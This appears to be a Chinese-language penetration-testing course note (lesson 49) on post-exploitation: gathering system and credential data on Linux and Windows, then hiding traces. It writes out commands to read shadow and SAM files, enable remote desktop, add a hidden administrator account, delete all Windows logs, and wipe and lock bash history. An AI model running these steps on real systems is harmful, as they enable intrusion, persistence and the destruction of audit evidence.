@@ -1,0 +1,492 @@
+课时49 收集敏感数据、隐藏痕迹
+
+╋━━━━━━━━━━━━━━╋
+┃利用配置不当提权            ┃
+┃    应用系统的配置文件      ┃
+┃    应用连接数据库的配置文件┃
+╋━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃基本信息收集                                              ┃
+┃    Linux                                                 ┃
+┃    /etc/resolv.conf                                      ┃
+┃    /etc/passwd                                           ┃
+┃    /etc/shadow                                           ┃
+┃    whoami and who –a                                    ┃
+┃    ifconfig -a, iptables -L -n, ifconfig –a, netstat –r┃
+┃    uname –a, ps aux                                     ┃
+┃    dpkg -l| head                                         ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# /etc/resolv.confDNS          //域名解析的配置文件
+
+root@kali:~# /etc/passwd       //存放用户账号
+
+root@kali:~# /etc/shadow       //存放用户密码
+
+
+---------------------------------------------
+ linux 里 /etc/passwd 、/etc/shadow和/etc/group 文件内容解释
+
+一、/etc/passwd 是用户数据库，其中的域给出了用户名、加密口令和用户的其他信息
+
+/etc/shadow文件中的记录行与/etc/passwd中的一一对应,它由pwconv命令根据/etc/passwd中的数据自动产生。它的文 件格式与/etc/passwd类似,由若干个字段组成,字段之间用“:”隔开。这些字段是:
+
+
+登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志
+1)“登录名”是与/etc/passwd文件中的登录名相一致的用户账号
+2)“口令”字段存放的是加密后的用户口令字,长度为13个字符。如果为空,则对应用户没有口令,登
+录时不需要口令;如果含有不属于集合{./0-9A-Za-z}中的字符,则对应的用户不能登录。
+3)“最后一次修改时间”表示的是从某个时刻起,到用户最后一次修改口令时的天数。时间起点对不同
+的系统可能不一样。例如在SCOLinux中,这个时间起点是1970年1月1日。
+4)“最小时间间隔”指的是两次修改口令之间所需的最小天数。
+5)“最大时间间隔”指的是口令保持有效的最大天数。
+6)“警告时间”字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。
+7)“不活动时间”表示的是用户没有登录活动但账号仍能保持有效的最大天数。
+8)“失效时间”字段给出的是一个绝对的天数,如果使用了这个字段,那么就给出相应账号的生存期。
+期满后,该账号就不再是一个合法的账号,也就不能再用来登录了。
+
+ 
+
+下面是/etc/shadow的一个例子:
+#cat /etc/shadow
+root:Dnakfw28zf38w:8764:0:168:7:::
+
+/etc/passwd
+该目录存储的是操作系统用户信息,该文件为所有用户可见。
+给linux系统添加一个帐号:
+useradd -g mysql -d /home/test -m test(:新建一个用户test, 属于mysql组,开始目录是/home/test)
+然后进入 /etc/passwd,可以看到如下信息,在最后一行可以看到刚加的用户的信息。如下
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+dovecot:x:97:97:dovecot:/usr/libexec/dovecot:/sbin/nologin
+webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
+squid:x:23:23::/var/spool/squid:/sbin/nologin
+pcap:x:77:77::/var/arpwatch:/sbin/nologin
+haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
+xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
+hsqldb:x:96:96::/var/lib/hsqldb:/sbin/nologin
+gdm:x:42:42::/var/gdm:/sbin/nologin
+hzmc:x:500:500:hzmc:/home/hzmc:/bin/bash
+mysql:x:501:501::/home/mysql:/bin/bash
+chenhua:x:503:501::/home/chenhua:/bin/bash
+test:x:504:501::/home/test:/bin/bash
+可以看出/etc/passwd文件存放的是用户的信息,由6个分号组成的7个信息,解释如下
+(1):用户名。
+(2):密码(已经加密)
+(3):UID(用户标识),操作系统自己用的
+(4):GID组标识。
+(5):用户全名或本地帐号
+(6):开始目录
+(7):登录使用的Shell,就是对登录命令进行解析的工具。
+
+ 
+
+二、/etc/shadow是在安装了影子(shadow)口令软件的系统上的影子口令文件
+
+shadow 是 passwd 的影子文件。
+在linux中，口令文件在/etc/passwd中，早期的这个文件直接存放加密后的密码，前两位是"盐"值，是一个随机数，后面跟的是加密的密码。为了安全，现在的linux都提供了 /etc/shadow这个影子文件，密码放在这个文件里面，并且是只有root可读的。
+/etc/passwd文件的每个条目有7个域，分别是名字：密码：用户id：组id：用户信息：主目录：shell
+例如：ynguo:x:509:510::/home/ynguo:/bin/bash
+在利用了shadow文件的情况下，密码用一个x表示，普通用户看不到任何密码信息。影子口令文件保存加密的口令；/etc/passwd文件中的密码全部变成x。Shadow只能是root可读，从而保证了安全。
+/etc/shadow文件每一行的格式如下：用户名：加密口令：上一次修改的时间（从1970年1月1日起的天数）：口令在两次修改间的最小天数：口令修改之前向用户发出警告的天数：口令终止后账号被禁用的天数：从1970年1月1日起账号被禁用的天数：保留域。
+例如：root:$1$t4sFPHBq$JXgSGgvkgBDD/D7FVVBBm0:11037:0:99999:7:-1:-1:1075498172
+
+ 
+
+下面为test用户设置密码,执行如下命令
+passwd test
+[root@localhost etc]# passwd test
+Changing password for user test.
+New UNIX password:
+Retype new UNIX password:
+passwd: all authentication tokens updated successfully.
+[root@localhost etc]#
+然后进入/etc/shadow文件下面可以看到如下信息
+gdm:!!:14302:0:99999:7:::
+hzmc:$1$JZMjXqxJ$bvRpGQxbuRiEa86KPLhhC1:14302:0:99999:7:::
+mysql:!!:14315:0:99999:7:::
+chenhua:$1$YBJZNyXJ$BnpKFD58vSgqzsyRO0ZeO1:14316:0:99999:7:::
+test:$1$hKjqUA40$OelB9h3UKOgnttKgmRpFr/:14316:0:99999:7:::
+可以发现,共有9个栏目
+(1):帐号名称
+(2):密码:这里是加密过的,但高手也可以解密的。要主要安全问题(代!符号标识该帐号不能用
+来登录)
+(3):上次修改密码的日期
+(4):密码不可被变更的天数
+(5):密码需要被重新变更的天数(99999表示不需要变更)
+(6):密码变更前提前几天警告
+(7):帐号失效日期
+(8):帐号取消日期
+(9):保留条目,目前没用
+
+ 
+
+Unix 系统最初是用明文保存密码的，后来由于安全的考虑，采用crypt()算法加密密码并存放在/etc/passwd文件。现在，由 于计算机处理能力的提高，使密码破解变得越来越容易。/etc/passwd文件是所有合法用户都可访问的，大家都可互相看到密码的加密字符串，这给系统 带来很大的安全威胁。现代的Unix系统使用影子密码系统，它把密码从/etc/pa sswd文件中分离出来，真正的密码保存在/etc/shadow文件中，shadow文件只能由超级用户访问。这样入侵者就不能获得加密密码串，用于破 解。使用shadow密码文件后，/etc/passwd文件中所有帐户的password域的内容为"x"，如果password域的内容为"*"，则 该帐号被停用。使用passwd这个程序可修改用户的密码。
+-------------------------------------------------------------------------------------------
+
+root@kali:~# ifconfig -a           //显示系统中所有接口信息
+
+root@kali:~# iptables -L -n    //防火墙配置
+
+root@kali:~# netstat -rn  //查看当前路由的设置
+
+root@kali:~# uname -a    //查看当前系统的版本
+
+root@kali:~# ps aux   //查看进程
+
+root@kali:~# dpkg -l| head    //所有的安装包
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃基本信息收集                                                          ┃
+┃    Windows                                                           ┃
+┃    ipconfig /all , ipconfig /displaydns, netstat -bnao , netstat –r ┃
+┃    net view , net view /domain                                       ┃
+┃    net user /domain, net user %username% /domain                     ┃
+┃    net accounts, net share                                           ┃
+┃    net localgroup administrators username /add                       ┃
+┃    net group "Domain Controllers" /domain                            ┃
+┃    net share name$=C:\ /unlimited                                    ┃
+┃    net user username /active:yes/domain                              ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+C:\Documents and Settings\Administrator>cd\
+
+C:\>ipconfig /?
+
+C:\>ipconfig /displaydns
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)                            ┃
+┃    wmic nicconfig get ipaddress,macaddress                         ┃
+┃    wmic computersystem get username                                ┃
+┃    wmic netlogin get name,lastlogon                                ┃
+┃    wmic process get caption, executablepath,commandline            ┃
+┃    wmic process where name=“calc.exe" call terminate              ┃
+┃    wmic os get name,servicepackmajorversion                        ┃
+┃    wmic product get name,version                                   ┃
+┃    wmic product where name=“name” call uninstall /nointeractive  ┃
+┃    wmic share get /ALL                                             ┃
+┃    wmic /node:"machinename" path Win32_TerminalServiceSetting where┃
+┃AllowTSConnections="0" call SetAllowTSConnections "1“              ┃
+┃    wmic nteventlog get path,filename, writeable                    ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+C:\>wmic nicconfig get ipaddress,macaddress     //读取当前系统ip地址和mac地址
+
+C:\>wmic computersystem get username          //查看当前登录账号
+
+C:\>wmic netlogin get name,lastlogon      //查看用户登录的信息
+LastLogon                  Name
+                           NT AUTHORITY\SYSTEM
+                           NT AUTHORITY\LOCAL SERVICE
+                           NT AUTHORITY\NETWORK SERVICE
+20150922182758.000000+480 W2K2\Administrator
+
+C:\>wmic process get caption, executablepath,commandline       //查看当前系统的进程
+
+C:\>wmic process where name=“calc.exe" call terminate         //结束进程
+
+C:\>wmic os get name,servicepackmajorversion     //提取操作系统serverpack版本
+Name                                                                                     ServicepackMajorVersion
+Microsoft Windows Server 2003 Enterprise Edition:C:\WINDOWS|\Device\Harddisk0\Partition1 2
+
+C:\>wmic product get name,version        //查看系统当前安装了哪些软件
+
+C:\>wmic product where name=“name” call uninstall /nointeractive     //卸载软件不产生任何提示
+
+C:\>wmic share get /ALL            //共享文件夹
+
+C:\>wmic /node:"machinename" path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1“    //开启远程桌面（支持远程的）
+
+C:\>wmic /node:"localhost" path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1“
+
+C:\>wmic nteventlog get path,filename, writeable   //查看当前系统日志
+FileName  Path                       Vriteable
+appevent  \windows\system32\config\  TRUE       //应用程序
+secevent  \windows\system32\config\  TRUE       //安全性
+sysevent  \windows\system32\config\  TRUE       //系统
+
+╋━━━━━━━━━━━━━━━━━━━╋
+┃收集敏感数据                          ┃
+┃    商业信息                          ┃
+┃    系统信息                          ┃
+┃    Linux                             ┃
+┃    /etc ； /usr/local/etc            ┃
+┃    /etc/password ； /etc/shadow      ┃
+┃    .ssh ； .gnupg 公私钥             ┃
+┃    The e-mail and data files         ┃
+┃    业务数据库 ；身份认证服务器数据库 ┃
+┃    /tmp                              ┃
+╋━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# cd .ssh/
+
+root@kali:~/.ssh# ls
+known_hosts
+
+root@kali:~/.ssh# cat known_hosts
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃收集敏感数据                                                              ┃
+┃    windows                                                               ┃
+┃    SAM 数据库 ； 注册表文件                                              ┃
+┃    %SYSTEMROOT%\repair\SAM                                               ┃
+┃    %SYSTEMROOT%\System32\config\RegBack\SAM                              ┃
+┃    业务数据库 ； 身份认证数据库                                          ┃
+┃    临时文件目录                                                          ┃
+┃    UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\ ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃隐藏痕迹                                                        ┃
+┃    禁止在登陆界面显示新建账号                                  ┃
+┃    REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows      ┃
+┃NT\CurrentVersion\WinLogon\SpecialAccounts\UserList" /v uname /T┃
+┃REG_DWORD /D 0                                                  ┃
+┃    del %WINDIR%\*.log /a/s/q/f                                 ┃
+┃    History                                                     ┃
+┃    日志                                                        ┃
+┃    auth.log / secure                                           ┃
+┃    btmp / wtmp                                                 ┃
+┃    lastlog / faillog                                           ┃
+┃    其他日志和 HIDS 等                                          ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+C:\>ner user a a /add
+
+C:\>net localgroup administrators a /add
+
+C:\>REH ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList" /v a /T REG_DWORD /D 0    //禁止在登陆界面显示新建账号
+
+C:\>del %WINDIR%\*.log /a/s/q/f       //删除日志
+
+root@kali:~# history        //命令历史
+
+root@kali:~# ls -l .bash_history
+-rw------- 1 root root 48948 9月  22 20:14 .bash_history
+
+root@kali:~# cat .bash_history
+
+root@kali:~# history -c   //擦除命令
+
+root@kali:~# history
+1017 history
+
+root@kali:~# lsa
+lsadump  lsar     lsattr
+
+root@kali:~# lsattr
+-------------e-- ./文档
+-------------e-- ./音乐
+-------------e-- ./图片
+-------------e-- ./桌面
+-------------e-- ./公共
+-------------e-- ./下载
+-------------e-- ./模板
+-------------e-- ./视频
+ 
+root@kali:~# cha
+chacl        chage     chardet     chardet3     chardetet    chardetec3  charmap    chat   chattr
+
+root@kali:~# chat
+chat    chattr
+
+root@kali:~# chattr -h
+Usage: chattr [-RVf] [-+=aAcCdDeijsStTu] [-v version] files...
+
+root@kali:~# man chattr
+
+CHATTR(1)                   General Commands Manual                  CHATTR(1)
+
+NAME
+       chattr - change file attributes on a Linux file system
+
+SYNOPSIS
+       chattr [ -RVf ] [ -v version ] [ mode ] files...
+
+DESCRIPTION
+       chattr changes the file attributes on a Linux file system.
+
+       The format of a symbolic mode is +-=[aAcCdDeijsStTu].
+
+       The  operator  '+'  causes  the  selected attributes to be added to the
+       existing attributes of the files; '-' causes them to  be  removed;  and
+       '=' causes them to be the only attributes that the files have.
+
+       The  letters  'aAcCdDeijsStTu' select the new attributes for the files:
+       append only (a), no atime updates (A), compressed (c), no copy on write
+       (C), no dump (d), synchronous directory updates (D), extent format (e),
+       immutable (i), data journalling (j), secure deletion  (s),  synchronous
+       updates  (S),  no tail-merging (t), top of directory hierarchy (T), and
+       undeletable (u).
+
+       The following attributes are read-only, and may be listed by  lsattr(1)
+       but  not  modified  by  chattr:  compression  error (E), huge file (h),
+       indexed directory (I), inline data (N), compression raw access (X), and
+       compressed dirty file (Z).
+
+       Not  all  flags  are supported or utilized by all filesystems; refer to
+       filesystem-specific man pages such as btrfs(5), ext4(5), and xfs(5) for
+       more filesystem-specific details.
+
+OPTIONS
+       -R     Recursively change attributes of directories and their contents.
+
+       -V     Be verbose with chattr's output and print the program version.
+
+       -f     Suppress most error messages.
+
+       -v version
+              Set the file's version/generation number.
+
+ATTRIBUTES
+       A  file  with the 'a' attribute set can only be open in append mode for
+writing.   Only   the   superuser   or   a   process   possessing   the
+       CAP_LINUX_IMMUTABLE capability can set or clear this attribute.
+
+       When a file with the 'A' attribute set is accessed, its atime record is
+       not modified.  This avoids a certain amount of disk I/O for laptop sys‐
+       tems.
+
+       A  file  with  the 'c' attribute set is automatically compressed on the
+       disk by the kernel.  A read from this file returns  uncompressed  data.
+       A  write  to this file compresses data before storing them on the disk.
+       Note: please make sure to read the bugs and limitations section at  the
+       end of this document.
+
+       A  file with the 'C' attribute set will not be subject to copy-on-write
+       updates.  This flag is only supported on  file  systems  which  perform
+       copy-on-write.   (Note: For btrfs, the 'C' flag should be set on new or
+       empty files.  If it is set on a file which already has data blocks,  it
+       is undefined when the blocks assigned to the file will be fully stable.
+       If the 'C' flag is set on a directory, it will have no  effect  on  the
+       directory,  but  new  files  created  in that directory will the No_COW
+       attribute.)
+
+       A file with the 'd' attribute set is not candidate for backup when  the
+       dump(8) program is run.
+
+       When  a  directory  with the 'D' attribute set is modified, the changes
+       are written synchronously on  the  disk;  this  is  equivalent  to  the
+       'dirsync' mount option applied to a subset of the files.
+
+       The  'e' attribute indicates that the file is using extents for mapping
+       the blocks on disk.  It may not be removed using chattr(1).
+
+       The 'E' attribute is used by the experimental  compression  patches  to
+       indicate that a compressed file has a compression error.  It may not be
+       set  or  reset  using  chattr(1),  although  it  can  be  displayed  by
+       lsattr(1).
+
+       The  'h' attribute indicates the file is storing its blocks in units of
+       the filesystem blocksize instead of in units of sectors, and means that
+       the file is (or at one time was) larger than 2TB.  It may not be set or
+       reset using chattr(1), although it can be displayed by lsattr(1).
+
+       A file with the 'i' attribute cannot be modified: it cannot be  deleted
+       or  renamed,  no  link  can  be created to this file and no data can be
+       written to the file.  Only the superuser or a  process  possessing  the
+       CAP_LINUX_IMMUTABLE capability can set or clear this attribute.
+
+       The  'I'  attribute is used by the htree code to indicate that a direc‐
+       tory is being indexed using hashed trees.  It may not be set  or  reset
+       using chattr(1), although it can be displayed by lsattr(1).
+
+       A  file  with the 'j' attribute has all of its data written to the ext3
+       or ext4 journal before  being  written  to  the  file  itself,  if  the
+       filesystem  is  mounted  with  the  "data=ordered"  or "data=writeback"
+       options.  When the filesystem is mounted with the "data=journal" option
+       all  file  data is already journalled and this attribute has no effect.
+       Only the superuser or a process possessing the  CAP_SYS_RESOURCE  capa‐
+       bility can set or clear this attribute.
+
+       A  file  with  the  'N'  attribute set indicates that the file has data
+       stored inline, within the inode itself. It may  not  be  set  or  reset
+       using chattr(1), although it can be displayed by lsattr(1).
+
+       When  a  file  with  the  's'  attribute set is deleted, its blocks are
+       zeroed and written back to the disk.  Note: please make  sure  to  read
+       the bugs and limitations section at the end of this document.
+
+       When  a  file  with  the 'S' attribute set is modified, the changes are
+       written synchronously on the disk; this is  equivalent  to  the  'sync'
+       mount option applied to a subset of the files.
+
+       A file with the 't' attribute will not have a partial block fragment at
+       the end of the file merged with  other  files  (for  those  filesystems
+       which  support  tail-merging).  This is necessary for applications such
+       as LILO which read the filesystem directly, and which don't  understand
+       tail-merged files.  Note: As of this writing, the ext2 or ext3 filesys‐
+       tems do not (yet, except in very experimental  patches)  support  tail-
+       merging.
+
+       A  directory  with  the  'T'  attribute will be deemed to be the top of
+       directory hierarchies for the purposes of the  Orlov  block  allocator.
+       This  is  a  hint to the block allocator used by ext3 and ext4 that the
+       subdirectories under this directory are not related, and thus should be
+       spread  apart  for allocation purposes.   For example it is a very good
+       idea to  set  the  'T'  attribute  on  the  /home  directory,  so  that
+       /home/john  and  /home/mary are placed into separate block groups.  For
+       directories where this attribute is not set, the Orlov block  allocator
+       will try to group subdirectories closer together where possible.
+
+       When  a  file  with  the 'u' attribute set is deleted, its contents are
+       saved.  This allows the user to ask for its undeletion.   Note:  please
+       make  sure  to read the bugs and limitations section at the end of this
+       document.
+
+       The 'X' attribute is used by the experimental  compression  patches  to
+       indicate  that  the  raw  contents of a compressed file can be accessed
+       directly.  It currently may  not  be  set  or  reset  using  chattr(1),
+       although it can be displayed by lsattr(1).
+
+       The  'Z'  attribute  is used by the experimental compression patches to
+       indicate a compressed file is dirty.  It may not be set or reset  using
+       chattr(1), although it can be displayed by lsattr(1).
+
+AUTHOR
+       chattr was written by Remy Card <Remy.Card@linux.org>.  It is currently
+       being maintained by Theodore Ts'o <tytso@alum.mit.edu>.
+
+BUGS AND LIMITATIONS
+       The 'c', 's',  and 'u' attributes are not honored by  the  ext2,  ext3,
+       and  ext4 filesystems as implemented in the current mainline Linux ker‐
+       nels.
+
+       The 'j' option is only useful if the filesystem is mounted as  ext3  or
+       ext4.
+
+       The 'D' option is only useful on Linux kernel 2.5.19 and later.
+
+AVAILABILITY
+       chattr  is  part  of  the  e2fsprogs  package  and  is  available  from
+       http://e2fsprogs.sourceforge.net.
+
+SEE ALSO
+       lsattr(1), btrfs(5), ext4(5), xfs(5).
+
+E2fsprogs version 1.42.12         August 2014                        CHATTR(1)
+
+root@kali:~# chattr +i .bash_history
+
+root@kali:~# lsattr .bash_history
+----i--------e-- .bash_history
+
+root@kali:~# chattr -i .bash_history
+
+root@kali:~# rm .bash_history
+
+root@kali:~# touch .bash_history   //添加文件
+
+root@kali:~# chattr +i .bash_history
+
+root@kali:~# lastb
+root     :0           :0               Mon Oct 26 12:25 - 12:25  (00:00)    
+root     :0           :0               Thu Oct 22 19:07 - 19:07  (00:00)    
+root     :0           :0               Wed Oct 21 19:53 - 19:53  (00:00)    
+root     :0           :0               Sun Oct 11 13:43 - 13:43  (00:00)    
+root     :0           :0               Sun Oct  4 15:48 - 15:48  (00:00)    
+root     :0           :0               Sat Oct  3 18:03 - 18:03  (00:00)    
+root     :0           :0               Fri Oct  2 14:14 - 14:14  (00:00)    
+root     :0           :0               Fri Oct  2 14:14 - 14:14  (00:00)   
+
